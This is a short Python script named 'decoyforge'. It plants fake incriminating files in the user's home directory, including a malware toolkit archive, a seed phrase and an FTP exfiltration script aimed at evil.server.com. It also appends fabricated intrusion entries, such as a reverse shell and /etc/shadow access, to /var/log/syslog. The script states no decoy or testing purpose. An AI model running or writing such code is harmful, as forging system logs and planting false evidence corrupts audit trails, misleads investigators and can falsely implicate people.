import os
import random
import time
from pathlib import Path

FAKE_FILES = {
    "Downloads/malware_toolkit_v5.zip": "Binary blob of compiled junk",
    "Documents/bitcoin_seed.txt": "seed: mimic flavor fall jelly cargo lens climb hazard pet globe matrix",
    "Scripts/ftp_exfiltrator.sh": "#!/bin/bash\nftp -n <<EOF\nopen evil.server.com\nuser anon pass\nput secrets.tar.gz\nEOF",
    "Desktop/notes_from_ops.md": "TODO: exfil DNS logs, rotate SSH keys, clean up traces.",
    "Pictures/data-leak-evidence.png": "[FAKE IMAGE BYTES]",
}

FAKE_LOGS = [
    "Accepted publickey for shadow from 192.168.1.77 port 2222 ssh2",
    "Reverse shell established from 10.8.0.2 to 198.51.100.23",
    "Unauthorized access to /etc/shadow by UID 1001",
    "Suspicious process forked: /tmp/.hidden/dropper",
]

def create_fake_files():
    base = Path.home()
    for rel_path, content in FAKE_FILES.items():
        path = base / rel_path
        path.parent.mkdir(parents=True, exist_ok=True)
        with open(path, "w") as f:
            f.write(content)
    print("[decoyforge] Fake files created in user directories.")

def poison_logs():
    syslog_path = "/var/log/syslog"
    if os.access(syslog_path, os.W_OK):
        with open(syslog_path, "a") as log:
            for entry in FAKE_LOGS:
                log.write(f"{time.strftime('%b %d %H:%M:%S')} fakehost {entry}\n")
        print("[decoyforge] Fake log entries appended.")
    else:
        print("[decoyforge] Skipped log injection (no permission).")

def main():
    create_fake_files()
    poison_logs()

if __name__ == "__main__":
    main()
